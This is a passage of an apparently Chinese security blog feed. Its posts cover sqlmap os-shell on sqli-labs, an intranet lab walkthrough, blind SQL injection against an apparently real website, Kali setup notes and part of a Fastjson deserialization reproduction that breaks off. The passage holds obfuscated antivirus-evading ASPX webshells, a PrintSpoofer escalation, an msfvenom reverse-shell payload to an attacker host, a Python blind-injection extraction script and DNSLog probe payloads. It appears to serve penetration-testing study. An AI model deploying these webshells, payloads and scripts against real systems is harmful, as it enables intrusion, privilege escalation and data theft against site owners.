</ol>
<br>

<h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><h4 id="æŸ¥çœ‹æ•°æ®åº“æƒé™æ˜¯å¦ä¸ºdba"><a href="#æŸ¥çœ‹æ•°æ®åº“æƒé™æ˜¯å¦ä¸ºdba" class="headerlink" title="æŸ¥çœ‹æ•°æ®åº“æƒé™æ˜¯å¦ä¸ºdba"></a>æŸ¥çœ‹æ•°æ®åº“æƒé™æ˜¯å¦ä¸ºdba</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --is-dba</code></p>
<p>current user is DBA: True</p>
<p><img src="/posts/a92f908a/id_dba.png"></p>
<br>

<h4 id="å¯»æ‰¾ç»å¯¹è·¯å¾„"><a href="#å¯»æ‰¾ç»å¯¹è·¯å¾„" class="headerlink" title="å¯»æ‰¾ç»å¯¹è·¯å¾„"></a>å¯»æ‰¾ç»å¯¹è·¯å¾„</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --sql-shell</code></p>
<p><code>select @@datadir</code></p>
<p><img src="/posts/a92f908a/dir.png"></p>
<p>select @@datadir: â€˜D:\phpstudy_pro\Extensions\MySQL5.7.26\data\â€˜</p>
<p>å¯ä»¥æ¨æµ‹åˆ° ç½‘ç«™æ ¹ç›®å½• <code>D:\phpstudy_pro\WWW</code></p>
<h4 id="os-shell"><a href="#os-shell" class="headerlink" title="os-shell"></a>os-shell</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --os-shell</code></p>
<p>å¡«å…¥ç»å¯¹è·¯å¾„</p>
<p><img src="/posts/a92f908a/os_shell.png"></p>
<p><img src="/posts/a92f908a/shell.png"></p>
<br>

<br>

<h3 id="å¯»æ‰¾ç½‘ç«™ç»å¯¹è·¯å¾„çš„æ–¹æ³•"><a href="#å¯»æ‰¾ç½‘ç«™ç»å¯¹è·¯å¾„çš„æ–¹æ³•" class="headerlink" title="å¯»æ‰¾ç½‘ç«™ç»å¯¹è·¯å¾„çš„æ–¹æ³•:"></a>å¯»æ‰¾ç½‘ç«™ç»å¯¹è·¯å¾„çš„æ–¹æ³•:</h3><ul>
<li>é€šè¿‡ç½‘ç«™æŠ¥é”™æŸ¥çœ‹ç»å¯¹è·¯å¾„</li>
<li>æ ¹æ®phpinfo æ¢é’ˆæŸ¥çœ‹ä¿¡æ¯</li>
<li>é…åˆè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´  å¦‚eval() ä¼ å…¥phpinfo()</li>
<li>æ ¹æ®é…ç½®æ–‡ä»¶è·å–è·¯å¾„ </li>
<li>é€šè¿‡æœç´¢å¼•æ“è·å– <code>Site:test.com warning</code> <code>Site:test.com &quot;fatal error&quot;</code></li>
</ul>
]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>kaliç½‘ç»œä¸å¯è¾¾</title>
    <url>/posts/5150e44b/</url>
    <content><![CDATA[<p>å‡ºç°é”™è¯¯ ç½‘ç»œä¸å¯è¾¾ </p>
<p>è§£å†³æ–¹æ³• æ‰“å¼€ç½‘å¡é…ç½®æ–‡ä»¶ <code>sudo vim /etc/network/interfaces</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#This file describes the network interfaces available on your system</span><br><span class="line"># and how to activate them. For more information, see interfaces(5)ï¼Œ</span><br><span class="line"></span><br><span class="line">source &#x2F;etc&#x2F;network&#x2F; interfaces.d&#x2F;*</span><br><span class="line"></span><br><span class="line">#The Loopback network interface</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet Loopback</span><br></pre></td></tr></table></figure>

<p>åœ¨åé¢æ·»åŠ ä¸¤è¡Œä»£ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure>

<p>ä¿å­˜é€€å‡ºé‡å¯å³å¯</p>
<br>

<br>

<p>Reference</p>
<blockquote>
<p><a href="https://developer.huaweicloud.com/hero/thread-69909-1-1.html">https://developer.huaweicloud.com/hero/thread-69909-1-1.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>æš—æœˆå†…ç½‘é¶æœºWP</title>
    <url>/posts/ab4fb19a/</url>
    <content><![CDATA[<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>webæœåŠ¡å™¨  </p>
<p>192.168.0.114 ï¼ˆæœ¬åœ°ä½¿ç”¨natï¼‰ </p>
<p>10.10.131(Vm18) å¼€å¯é˜²ç«å¢™ å®‰å…¨ç‹— å’Œwindowsè‡ªå¸¦æ€è½¯</p>
<p>OAç³»ç»Ÿ</p>
<p>10.10.1.130ï¼ˆVM18ï¼‰</p>
<p>10.10.10.166ï¼ˆVM19ï¼‰å¼€å¯é˜²ç«å¢™ 360å…¨å®¶æ¡¶</p>
<p>åŸŸæ§dc</p>
<p>10.10.10.165ï¼ˆVM19ï¼‰ æ— é˜²æŠ¤è½¯ä»¶</p>
<p><img src="/posts/ab4fb19a/tuopu.png"></p>
<br>

<p>3å°æœºå™¨å¯†ç </p>
<p>win2016-web     <code>!@#QWE123</code></p>
<p>win2016-dc        <code>!@#QWE123.</code></p>
<p>win2012 oa        <code>!@#Q123</code></p>
<br>

<p>ç›®çš„ :è·å–åŸŸæ§ä¸­çš„flag.txtå†…å®¹</p>
<br>

<p>å…ˆä¿®æ”¹hostæ–‡ä»¶ ç»‘å®šipå’ŒåŸŸå 192.168.0.144 <a href="http://www.moonlab.com/">www.moonlab.com</a></p>
<h4 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h4><p>nmapæ‰«ä¸€ä¸‹ç«¯å£</p>
<p><code>sudo nmap -sV -p- 192.168.0.114</code> å¼€æ”¾äº†21 90 999 3389 5985 6588ç«¯å£</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap -sV -p- 192.168.0.114<br>[sudo] kali çš„å¯†ç ï¼š<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-06-16 10:55 CST<br>Nmap scan report for <a href="http://www.moonlab.com/">www.moonlab.com</a> (192.168.0.114)<br>Host is up (0.00040s latency).<br>Not shown: 65529 filtered ports<br>PORT     STATE SERVICE       VERSION<br>21/tcp   open  ftp           Microsoft ftpd<br>80/tcp   open  http          Microsoft IIS httpd 10.0<br>999/tcp  open  http          Microsoft IIS httpd 10.0<br>3389/tcp open  ms-wbt-server Microsoft Terminal Services<br>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>6588/tcp open  http          Microsoft IIS httpd 10.0<br>MAC Address: 00:0C:29:36:38:42 (VMware)<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 123.13 seconds</p>
</blockquote>
<p>çœ‹ä¸‹robots.txt</p>
<blockquote>
<p>User-agent: *<br>Disallow: /SiteServer/<br>Disallow: /SiteFiles/<br>Disallow: /UserCenter/</p>
</blockquote>
<p>è®¿é—®<code>http://www.moonlab.com/siteserver</code>çœ‹åˆ°ä¸€ä¸ªç®¡ç†å‘˜ç™»é™†é¡µé¢ï¼Œä½¿ç”¨çš„æ˜¯siteserver cms</p>
<p>ç³»ç»Ÿç‰ˆæœ¬ï¼š3.6.4 .NET ç‰ˆæœ¬ï¼š2.0 æ•°æ®åº“ï¼šSqlServer </p>
<h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><p>å»ç½‘ä¸ŠæŸ¥ä¸€ä¸‹æœ‰æ²¡æœ‰ç›¸å…³æ¼æ´ã€‚</p>
<p>å‘ç°SiteServer cmså­˜åœ¨ç®¡ç†å‘˜å¯†ç æ‰¾å›æ¼æ´ï¼Œåªéœ€è¦å…³é—­js ç„¶åè¾“å…¥admin ç‚¹å‡»ä¸‹ä¸€æ­¥å³å¯å¾—åˆ°ç®¡ç†å‘˜å¯†ç </p>
<p><img src="/posts/ab4fb19a/1.png"></p>
<p><img src="/posts/ab4fb19a/2.png"></p>
<p><img src="/posts/ab4fb19a/3.png"></p>
<p>å¾—åˆ°å¯†ç ä¸º admin5566 æˆåŠŸç™»å½•åˆ°åå°</p>
<h4 id="ä¸Šä¼ webshell"><a href="#ä¸Šä¼ webshell" class="headerlink" title="ä¸Šä¼ webshell"></a>ä¸Šä¼ webshell</h4><p>è€ƒè™‘ç›´æ¥åœ¨ç«™ç‚¹æ–‡ä»¶ç®¡ç†å¤„ ä¸Šä¼ ä¸€ä¸ªaspxçš„ä¸€å¥è¯ï¼Œä½†æ˜¯è¢«å®‰å…¨ç‹—æ‹¦æˆªäº†</p>
<p>çœ‹åˆ°æœ‰.aspxçš„æ–‡ä»¶ ç›´æ¥è¿›è¡Œç¼–è¾‘ä¿®æ”¹,ç„¶åå°è¯•è¿æ¥ä¸€å¥è¯ï¼Œå¯†ç ä¸º 1  ï¼ŒæˆåŠŸä½¿ç”¨èšå‰‘è¿æ¥</p>
<p><img src="/posts/ab4fb19a/ant4.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;Jscript&quot; Debug&#x3D;true%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">var SE&#x3D;Request.Form[&quot;1&quot;];</span><br><span class="line">var SMQ&#x3D;&quot;unsa&quot;,FWJVPDC&#x3D;&quot;fe&quot;,PZEGHR&#x3D;SMQ+FWJVPDC;</span><br><span class="line">function AJHB()</span><br><span class="line">&#123;</span><br><span class="line">return SE;</span><br><span class="line">&#125;</span><br><span class="line">function NCBRJ()</span><br><span class="line">&#123;</span><br><span class="line">    eval(AJHB(),PZEGHR);</span><br><span class="line">&#125;</span><br><span class="line">NCBRJ()</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<br>

<p>ä¹Ÿå¯ä»¥åœ¨æ¨¡å—ç®¡ç†å¤„ä¸Šä¼ ,åœ¨ç½‘ä¸Šæ‰¾äº†ä¸ªaspxä¸€å¥è¯å…æ€ï¼Œå¯†ç ä¸ºM</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;% var p &#x3D; Request.Item[&quot;M&quot;]; var a &#x3D; p.substring(0,1); var b &#x3D; p.substring(1,99999); var c &#x3D; &quot;un&quot; + Char ( 115 ) + Char ( 97 ) + &quot;fe&quot;; eval(a+b,c);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡ç«™ç‚¹æ–‡ä»¶ç®¡ç† å¯ä»¥æ‰¾åˆ°ä¸€å¥è¯ä¸Šä¼ çš„è·¯å¾„ ä¸º æ ¹ç›®å½•\SiteFiles\SiteTemplates\1\ </p>
<p><img src="/posts/ab4fb19a/4.png"></p>
<br>

<p>ä½¿ç”¨èšå‰‘è¿æ¥</p>
<p><img src="/posts/ab4fb19a/ant1.png"></p>
<p>whoami æ˜¾ç¤ºä¸º <code>iis apppool\moonlab</code></p>
<p>systeminfo æŸ¥çœ‹å€¼æ‰“äº†ä¸¤ä¸ªè¡¥ä¸</p>
<p>tasklist /svc æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹ï¼ŒæŸ¥çœ‹å­˜åœ¨ä»€ä¹ˆæ€è½¯ï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨å®‰å…¨ç‹—</p>
<p>netstat -ano æŸ¥çœ‹æœ¬æœºå¼€æ”¾ç«¯å£</p>
<p>net start æŸ¥çœ‹å·²ç»å¯åŠ¨çš„windowsæœåŠ¡</p>
<blockquote>
<p>   Safedog Guard Center<br>   Safedog Update Center<br>   SafeDogCloudHelper</p>
</blockquote>
<p><img src="/posts/ab4fb19a/ant3.png"></p>
<br>

<h4 id="åˆ©ç”¨PrintSpoofer-ææƒ"><a href="#åˆ©ç”¨PrintSpoofer-ææƒ" class="headerlink" title="åˆ©ç”¨PrintSpoofer ææƒ"></a>åˆ©ç”¨PrintSpoofer ææƒ</h4><p>å°† PrintSpoofer.exe ä¸Šä¼ åˆ° windows/Temp ä¸­</p>
<p>PrintSpoofer64.exe -h æŸ¥çœ‹å¸®åŠ©</p>
<p>![PrintSpoofer1.PNG]</p>
<p>PrintSpoofer64.exe -i -c â€œwhoamiâ€</p>
<p><img src="/posts/ab4fb19a/PrintSpoofer2.png"></p>
<p>æˆåŠŸæ‰§è¡Œ systemæƒé™</p>
<br>

<hr>
<p>åç»­è¿˜æœªå®Œæˆâ€¦..</p>
<h4 id="msfç”Ÿæˆpayload"><a href="#msfç”Ÿæˆpayload" class="headerlink" title="msfç”Ÿæˆpayload"></a>msfç”Ÿæˆpayload</h4><br>

<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.128  LPORT=2333 -e x86/shikata_ga_nai  -i 20 -f csharp -o 1.txt</code></p>
]]></content>
      <categories>
        <category>moon</category>
      </categories>
      <tags>
        <tag>moon</tag>
      </tags>
  </entry>
  <entry>
    <title>æŸç½‘ç«™sqlç›²æ³¨</title>
    <url>/posts/a615296a/</url>
    <content><![CDATA[<p><code>http://www.xxxxxx.com/products.php?id=113</code></p>
<p><code>http://www.xxxxxx.com/products.php?id=114-1</code>  ä¸¤é¡µé¢æ˜¾ç¤ºç›¸åŒ</p>
<p>å°è¯•é—­åˆ</p>
<p><code>http://www.xxxxxx.com/products.php?id=113&#39;</code>  é¡µé¢æ˜¾ç¤ºé”™è¯¯</p>
<p>ä½¿ç”¨ â€œ â€˜ ) ç­‰é—­åˆå¤–åŠ æ³¨é‡Šä¹Ÿæ˜¾ç¤ºé”™è¯¯</p>
<p>æµ‹è¯•å‘ç°ä¸éœ€è¦è¿›è¡Œé—­åˆ</p>
<br>

<p><code>http://www.xxxxxx.com/products.php?id=113%20and%201=1</code> é¡µé¢æ­£å¸¸</p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%201=2</code> é¡µé¢é”™è¯¯</p>
<p>ä½¿ç”¨order by æµ‹å­—æ®µæ•°</p>
<p><code>http://www.xxxxxx.com/products.php?id=113 order by 2</code> å‘ç°æ— å›æ˜¾</p>
<p>æ¨æµ‹æ˜¯ç›²æ³¨</p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20sleep(3)</code> ä¼šå»¶æ—¶</p>
<p>åˆ¤æ–­æ•°æ®åº“ç‰ˆæœ¬</p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20left(version(),6)=%275.5.46%27</code> å¾—åˆ° ä¸ºmysql 5.5.46</p>
<p>åˆ¤æ–­å½“å‰æ•°æ®åº“é•¿åº¦</p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20length(database())&gt;5</code></p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20length(database())=6</code></p>
<p>å¾—åˆ°é•¿åº¦ä¸º6ä½</p>
<p>çŒœè§£æ•°æ®åº“</p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20ascii(substr(database(),1,1))&gt;114</code></p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20ascii(substr(database(),1,1))=115</code></p>
<p>åˆ¤æ–­å‡ºç¬¬ä¸€ä½ä¸º 115 å¯¹åº” s</p>
<p>å¾—åˆ°æ•°æ®åº“åä¸º skytex</p>
<p>åˆ¤æ–­è¡¨é•¿åº¦</p>
<p><code>http://www.xxxxxx.com/products.php?id=113 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=5</code></p>
<p>å¾—åˆ°ç¬¬ä¸€å¼ è¡¨é•¿åº¦ä¸º5</p>
<p><code>http://www.xxxxxx.com/products.php?id=113 and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=10</code></p>
<br>

<p>ç¬¬nå¼ è¡¨</p>
<p><code>length((select table_name from information_schema.tables where table_schema=database() limit &#123;n&#125;,1))&gt;&#123;m&#125;</code></p>
<p>è·‘è¡¨å†…å®¹</p>
<p><code>http://www.xxxxxx.com/products.php?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#39;skytex&#39; limit 0,1),1,1))=97</code></p>
<p>ç¬¬ä¸€å¼ è¡¨ä¸º atype</p>
<p>ç¬¬äºŒå¼ è¡¨ä¸º atypeainfo</p>
<p>â€¦ â€¦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://www.xxxxxx.com/products.php/&#x27;</span></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>))   <span class="comment">#å¤§/å°å†™å­—æ¯å’Œæ•°å­—çš„asciiï¼Œlen=62</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•°æ®åº“é•¿åº¦ä½6</span></span><br><span class="line"><span class="comment"># ç¬¬ä¸€å¼ è¡¨é•¿ 5 ç¬¬äºŒå¼ è¡¨é•¿ 10 ç¬¬ä¸‰å¼ è¡¨ä¸º 8 ç¬¬å››å¼ è¡¨ 9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):  <span class="comment">#æ”¹å˜è¿™é‡Œé•¿åº¦</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high - low &gt; <span class="number">1</span>:</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line">        m = payloads[mid]  <span class="comment"># äºŒåˆ†æ³•åˆ¤æ–­</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=113 and ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;m&#125;&quot;  #æ•°æ®åº“ä¸º skytex</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;skytex&#x27; limit 0,1),&#123;i&#125;,1))&gt;&#123;m&#125;&quot;    #ç¬¬ä¸€å¼ è¡¨ atype</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;skytex&#x27; limit 1,1),&#123;i&#125;,1))&gt;&#123;m&#125;&quot;    #ç¬¬äºŒå¼ è¡¨ atypeinfo</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;skytex&#x27; limit 2,1),&#123;i&#125;,1))&gt;&#123;m&#125;&quot;    #ç¬¬ä¸‰å¼ è¡¨ feedback</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;skytex&#x27; limit 3,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>&quot;</span>    <span class="comment">#ç¬¬å››å¼ è¡¨ webadmin</span></span><br><span class="line"></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;PZ-CAP&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>kaliå®‰è£…java8</title>
    <url>/posts/6cf74356/</url>
    <content><![CDATA[<h3 id="å®˜ç½‘ä¸‹è½½"><a href="#å®˜ç½‘ä¸‹è½½" class="headerlink" title="å®˜ç½‘ä¸‹è½½"></a>å®˜ç½‘ä¸‹è½½</h3><p><code>https://www.oracle.com/technetwork/java/javase/downloads/index.html</code> é€‰æ‹©ä¸‹è½½java8 æœ€æ–°ç‰ˆä¸º<code>jdk-8u291-linux-x64.tar.gz</code></p>
<h3 id="Jdk-ä¼ åˆ°kaliå¹¶è§£å‹"><a href="#Jdk-ä¼ åˆ°kaliå¹¶è§£å‹" class="headerlink" title="Jdk ä¼ åˆ°kaliå¹¶è§£å‹"></a>Jdk ä¼ åˆ°kaliå¹¶è§£å‹</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;usr&#x2F;local&#x2F;java</span><br><span class="line">mv jdk-8u291-linux-x64.tar.gz &#x2F;usr&#x2F;local&#x2F;java</span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;java</span><br><span class="line">sudo tar -zxvf jdk-8u281-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…å¹¶æ³¨å†Œ"><a href="#å®‰è£…å¹¶æ³¨å†Œ" class="headerlink" title="å®‰è£…å¹¶æ³¨å†Œ"></a>å®‰è£…å¹¶æ³¨å†Œ</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;java java &#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_291&#x2F;bin&#x2F;java 1</span><br><span class="line">update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;javac javac &#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_291&#x2F;bin&#x2F;javac 1</span><br><span class="line">update-alternatives --set java &#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_291&#x2F;bin&#x2F;java</span><br><span class="line">update-alternatives --set javac &#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_291&#x2F;bin&#x2F;javac</span><br></pre></td></tr></table></figure>

<h3 id="æŸ¥çœ‹javaç‰ˆæœ¬"><a href="#æŸ¥çœ‹javaç‰ˆæœ¬" class="headerlink" title="æŸ¥çœ‹javaç‰ˆæœ¬"></a>æŸ¥çœ‹javaç‰ˆæœ¬</h3><p><code>java -version</code></p>
<blockquote>
<p>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</p>
<p>java version â€œ1.8.0_291â€<br>Java(TM) SE Runtime Environment (build 1.8.0_291-b10)<br>Java HotSpot(TM) 64-Bit Server VM (build 25.291-b10, mixed mode)</p>
</blockquote>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjsonååºåˆ—åŒ–å¤ç°</title>
    <url>/posts/37afa0e0/</url>
    <content><![CDATA[<h3 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h3><p>fastjson æ˜¯ä¸€æ¬¾é˜¿é‡Œçš„å¼€æºjavaåº“ï¼Œç”¨æ¥å®ç°java å¯¹è±¡ä¸jsonå­—ç¬¦ä¸²ä¹‹é—´çš„ç›¸äº’è½¬åŒ–</p>
<p>ååºåˆ—åŒ–å¸¸ç”¨çš„ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼Œä¸€ç§æ˜¯åŸºäºrmi(Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨)ï¼Œä¸€ç§æ˜¯åŸºäºldapã€‚</p>
<p>@typeå¤„å¯ä»¥åšååºåˆ—åŒ– åšååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨å¯¹è±¡çš„setæ–¹æ³•<br>ä½¿ç”¨ JdbcRowSetImpl ä»è¿œç¨‹æœåŠ¡å™¨ä¸ŠåŠ è½½æœåŠ¡å™¨ç«¯çš„ç±» ä»è€Œæ‰§è¡Œæ¶æ„ä»£ç </p>
<h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><p>é¶æœº vulhub-fastjson-1.2.24</p>
<p>ipï¼š192.168.20.128</p>
<p>kaliï¼š192.168.20.129</p>
<p><code>docker-compose up -d</code> è®¿é—®<code>192.168.20.128:8090</code></p>
<h4 id="æ¼æ´æ£€æµ‹"><a href="#æ¼æ´æ£€æµ‹" class="headerlink" title="æ¼æ´æ£€æµ‹"></a>æ¼æ´æ£€æµ‹</h4><h5 id="DNSLogå›æ˜¾"><a href="#DNSLogå›æ˜¾" class="headerlink" title="DNSLogå›æ˜¾"></a>DNSLogå›æ˜¾</h5><p>æ„é€ POSTè¯·æ±‚åŒ…ï¼Œfastjsonå¯ä»¥è§£æpayloadä¸­valçš„å€¼ï¼Œå¦‚æœdnslogæœ‰å›æ˜¾å³ä¸ºfastjson</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;:0</span><br></pre></td></tr></table></figure>

<br>

<h4 id="RMIæ–¹å¼"><a href="#RMIæ–¹å¼" class="headerlink" title="RMIæ–¹å¼"></a>RMIæ–¹å¼</h4><h5 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h5><ol>
<li>é¶æœºä¸ºvulhub8090ç«¯å£</li>
<li>kaliä¸Šåˆ©ç”¨pythonå¼€å¯webæœåŠ¡ï¼Œå¹¶æŠŠç¼–è¯‘åçš„expæ”¾åˆ°é‡Œé¢</li>
<li>kali 8001ç«¯å£å¼€å¯ rmi æœåŠ¡ï¼ˆrmi è¿œç¨‹æ–¹æ³•è°ƒç”¨  Aä¸»æœºå»è°ƒç”¨Bä¸»æœºä¸Šçš„exp.classæ–¹æ³•ï¼‰</li>
<li>kali 8888ç«¯å£ç›‘å¬åå¼¹çš„shell</li>
</ol>
<h5 id="ä½¿ç”¨kaliæ­å»ºä¸€ä¸ªä¸´æ—¶webæœåŠ¡"><a href="#ä½¿ç”¨kaliæ­å»ºä¸€ä¸ªä¸´æ—¶webæœåŠ¡" class="headerlink" title="ä½¿ç”¨kaliæ­å»ºä¸€ä¸ªä¸´æ—¶webæœåŠ¡"></a>ä½¿ç”¨kaliæ­å»ºä¸€ä¸ªä¸´æ—¶webæœåŠ¡</h5><p><code>python3 -m http.server 9999</code></p>
<h5 id="ç¼–è¯‘ç”Ÿäº§exp-æ”¾åœ¨webç›®å½•ä¸‹"><a href="#ç¼–è¯‘ç”Ÿäº§exp-æ”¾åœ¨webç›®å½•ä¸‹" class="headerlink" title="ç¼–è¯‘ç”Ÿäº§exp,æ”¾åœ¨webç›®å½•ä¸‹"></a>ç¼–è¯‘ç”Ÿäº§exp,æ”¾åœ¨webç›®å½•ä¸‹</h5><p>Exploit.java</p>
